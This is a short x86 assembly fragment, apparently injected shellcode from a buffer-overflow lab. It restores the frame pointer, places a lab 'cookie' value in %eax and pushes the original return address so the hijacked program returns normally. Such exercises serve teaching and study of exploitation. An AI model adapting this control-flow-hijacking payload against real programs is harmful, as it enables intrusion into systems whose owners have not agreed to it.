leal 0x28(%esp), %ebp  #recovery ebp
movl $0x6c1145d7, %eax   #send bobo cookie to eax
pushl $0x8048e15   #return address
ret
